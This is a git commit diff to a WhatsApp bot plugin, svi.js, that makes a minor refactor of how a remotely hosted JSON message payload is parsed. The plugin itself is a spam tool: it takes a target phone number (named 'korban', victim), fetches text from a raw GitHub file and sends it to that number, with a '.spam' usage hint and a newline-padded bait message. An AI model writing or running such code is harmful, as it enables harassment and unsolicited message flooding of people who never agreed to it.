f65c3e15892107c5d096bc199d7fbf89a589fc02
hdiiofficial <79190751+hdiiofficial@users.noreply.github.com>
2022-06-20 01:26:03 +0700

    Update svi.js

--- plugins/svi.js
+++ plugins/svi.js
@@ -7,11 +7,10 @@ let handler = async(m, { conn, text, args }) => {
     if (text.startsWith('@')) return conn.reply(m.chat, '[!] Tolong masukan Nomor dengan awalaan 62\n\n*Contoh:*\n.spam 6285xxxxxxxx|elyas ganteng', m)
     let res = await fetch(global.API('https://raw.githubusercontent.com', '/hdiiofficial/175/main/api/bahan.json'))
     if (!res.ok) throw await res.text()
-    let bahan = await res.json()
 
     let korban = `${text}`
     var nomor = m.sender
-    let spam1 = bahan
+    let spam1 = await res.json()
     let umpan = `Punten oyyy\n\n\nAda orang?\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nMwehehe`
     
     conn.sendMessage(korban + '@s.whatsapp.net', {text:spam1}, {quoted:m})
